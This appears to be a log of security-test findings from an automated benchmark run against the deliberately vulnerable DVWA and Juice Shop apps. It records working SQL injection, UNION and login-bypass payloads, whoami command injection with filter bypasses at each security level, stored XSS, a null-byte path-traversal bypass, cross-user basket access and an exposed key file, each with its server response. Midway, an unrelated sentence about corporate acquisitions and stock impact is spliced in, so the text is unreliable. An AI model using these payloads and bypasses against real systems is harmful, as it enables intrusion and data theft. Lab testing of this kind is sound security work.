findings.title: DVWA SQL Injection (id parameter) [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 -> HTTP 200, 5 records: ID 1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 -> HTTP 200, zero records (User ID: field empty, no 'First name'/'Surname' rows). Session security_level=low, SQLi DB mysql. Seeded surnames recorded: Brown, Me, Picasso, Smith, admin.

findings.title: DVWA OS Command Injection (ip parameter) [security=low]
findings.response_evidence: [security=low] HTTP 200. Ping output for 127.0.0.1 (4 packets, 0% loss) followed by the injected command output line: "www-data" (appears immediately after the ping statistics block, before 'More Information'). Behavioral proof: the web-process identity www-data was returned by the injected whoami.

findings.title: DVWA Stored XSS (mtxMessage guestbook) [security=low]
request_sequence: POST /vulnerabilities/xss_s/ txtName=bench&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin); browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin); browser_eval_js('window.xss_flag')
findings.response_evidence: [security=low] POST returned HTTP 200 and the guestbook entry 'Name: bench Message:' was stored (the script element is hidden from visible text, as expected for injected markup). Canary is exactly 50 characters, fitting mtxMessage maxlength=50 (the earlier note of 47 was a miscount). On rendering the page in the dvwa_admin browser session, the injected script executed.

findings.title: Juice Shop login authentication-bypass SQL injection via email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid auth token was issued for the first user (admin@juice-sh.op) with an arbitrary password, confirming SQL injection in the login query.

findings.title: Juice Shop product search SQL injection (SQLITE_ERROR and UNION)
findings.response_evidence: Baseline q=apple: HTTP 200 {"status":"success","data":[Apple Juice (1000ml) id 1, Apple Pomace id 24]} with no error. q=qwert': HTTP 500 text/html "Error: SQLITE_ERROR: near \"'%'\": syntax error". q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}, showing the injected UNION columns are reflected in the output. Injection is confirmed by both the SQL error and the successful UNION.

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..."

The high-level criteria require security=high, and the Coordinator instructed not to raise levels in this step. The session-input POST payload (id=1' OR '1'='1' #) was therefore not tested. findings.title: Unauthenticated User-Feedback Exposure on /api/Feedbacks (only masked author fragments)
findings.response_evidence: Unauthenticated request returned HTTP 200 with 8 feedback records (UserId, id, comment, rating, createdAt) without auth. Author emails are NOT disclosed in full: comments contain masked fragments only, e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***ereum@juice-sh.op)'. Other records show '(anonymous)' with UserId null. UserId values (1, 2, 3, 21) are exposed and are unauthenticated, but the email PII is partial. Records are accessible without auth, but the criteria require author email addresses to be disclosed, so this is not confirmed. Partial-email/UserId exposure is noted as a lower-severity issue.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id
findings.response_evidence: acct1 (acct1_bench@juiceshop.local) owns basket 6 (UserId 22), containing Apple Juice (1000ml) (Product id 1), quantity 3. acct2 (acct2_bench@juiceshop.local, own_basket_id=7) requested GET /rest/basket/6 and received HTTP 200 with {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"quantity":3}}]}}. acct2 is not the owner of basket 6, so this is cross-user access to another account's basket and item.

findings.title: Exposed Encryption-Keys Directory Browsable Without Authentication
findings.response_evidence: GET /encryptionkeys/ -> HTTP 200, text/html. Directory listing: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM"; links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key. GET /encryptionkeys/premium.key -> HTTP 200, application/octet-stream, body: "1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42". Directory is browsable unauthenticated and exposes sensitive key material (premium.key, jwt.pub listed). jwt.pub was listed but not separately fetched.

findings.title: Exposed Premium Encryption Key Retrievable Unauthenticated
findings.response_evidence: GET /encryptionkeys/premium.key -> HTTP 200, application/octet-stream, body excerpt: "1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42" (50-byte file, matches listing size). Key file served with no authentication.

findings.title: Raw Access to Restricted FTP Backup File Blocked (403) - Baseline for Null-Byte Path Traversal
findings.response_evidence: Raw path: GET /ftp/package.json.bak -> HTTP 403, body "Error: Only .md and .pdf files are allowed!" (served by /juice-shop/build/routes/fileServer.js). Bypass: GET /ftp/package.json.bak%2500.md -> HTTP 200, application/octet-stream, body begins with the juice-shop package.json content: {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}}. The extension filter was bypassed via the double-encoded null byte, returning the restricted .bak backup file. Confirmed CWE-22 null-byte path traversal / extension-filter bypass.

findings.title: Cross-user basket access (BOLA): acct2 retrieves acct1's basket 6
findings.response_evidence: acct1 own basket: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"BasketId":6,"quantity":3}}]}}. acct2 (own basket is 7) GET /rest/basket/6 returned HTTP 200 with the same body: id 6, UserId 22 (acct1's user), Products[0] = Apple Juice (1000ml), quantity 3. acct2 is not the owner of basket 6, and the server did not enforce ownership.

findings.title: DVWA security.php: configuration context check (security level control present; no access-control weakness demonstrated)
findings.response_evidence: HTTP 200, text/html. Session info: username admin, security_level low. Page text: 'Security level is currently: low.' Form: action http://dvwa/security.php, method POST, fields security (select, options low/medium/high/impossible), seclev_submit (submit=Submit), user_token (hidden, present). The level-change control is protected by a per-form user_token. A GET alone demonstrates only that the page is viewable by the admin session; no server-side access-control weakness was shown. Unauthenticated access, token-less POST, and level change were NOT tested (level not changed in this step, per instruction), so CWE-284 is not demonstrated. Verdict inconclusive, not confirmed.

findings.title: Unauthenticated User-Feedback listing exposes partially masked author emails
findings.response_evidence: Request 1: HTTP 200 without any Authorization header, JSON {"status":"success","data":[...8 records...]} with fields UserId, id, comment, rating, createdAt, updatedAt. Authored comments end with masked author fragments, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries show "(anonymous)". No full email address is present in any record. Request 2: GET /api/Feedbacks/1 returns HTTP 401 credentials_required ("No Authorization header was found"), so single-record access requires auth. Verdict: the list is readable unauthenticated and does leak UserId values and partial email fragments (local-part suffix and domain), but full author email addresses are not disclosed, so PII exposure is not conclusively proven. Recommend a follow-up on the authenticated view only if the Coordinator wants full-address confirmation.

findings.title: Unauthenticated /rest/user/whoami does not disclose user identity
findings.response_evidence: HTTP 200, content-type application/json, body {"user":{}} with no id, email, or token fields. The unauthenticated caller receives an empty user object, so no identity or email data leaks. Authenticated comparison with acct1 was not needed, since the unauthenticated response already shows no data disclosure.

findings.title: [security=medium] SQL Injection (numeric boolean) in SQLi id field
request_sequence: POST http://dvwa/security.php  (session dvwa_admin; security=medium, seclev_submit=Submit, user_token=[REDACTED] -> 302, page then reports 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE condition 'id=1 OR 1=1' returned 5 records with surnames: admin (First name admin), Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob), e.g. 'ID: 1 OR 1=1 First name: Gordon Surname: Brown'. FALSE condition 'id=1 AND 1=2' returned zero record rows (only 'User ID: 1 2 3 4 5' header, no 'First name/Surname' lines). Page shows 'Security Level: medium'. Numeric injection bypasses the medium quote-escaping.

findings.title: [security=medium] OS Command Injection via pipe bypass in ping ip field
request_sequence: POST http://dvwa/security.php  (session dvwa_admin; security=medium, seclev_submit=Submit, user_token=[REDACTED] -> 302 to /security.php, subsequent pages show Security Level: medium
findings.response_evidence: [security=medium] Response to ip='127.0.0.1| whoami' rendered ping section output followed by the line 'www-data' under 'Enter an IP address:' output block (pre block contains 'www-data'). Page shows 'Security Level: medium'. Pipe character was not blacklisted at medium (only ';' and '&&').

findings.title: [security=high] SQL Injection via session-input.php id parameter (trailing-comment boolean)
request_sequence: POST http://dvwa/security.php (dvwa_admin) security=high, seclev_submit=Submit, user_token=[REDACTED] -> 302; GET /security.php shows 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # on GET /vulnerabilities/sqli/ returned 5 records with surnames: admin (First name: admin), Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload 1' AND '1'='2' # returned zero 'ID:' records (only the form and 'Click here to change your ID'). Security level confirmed high on security.php page body. Note: session_info label in tool output still displayed 'low' but page body reported 'high'.

findings.title: [security=high] OS Command Injection via ip parameter (pipe without trailing space)
request_sequence: POST http://dvwa/security.php (dvwa_admin) security=high (level already set to high in prior step)
findings.response_evidence: [security=high] Response body under 'Enter an IP address' contained the output line 'www-data' following the ping output context ('Ping a device'). Security level in page body: high. Payload 127.0.0.1|whoami (no trailing space) bypassed the high-level blacklist of '; ', '| ', '&&'.
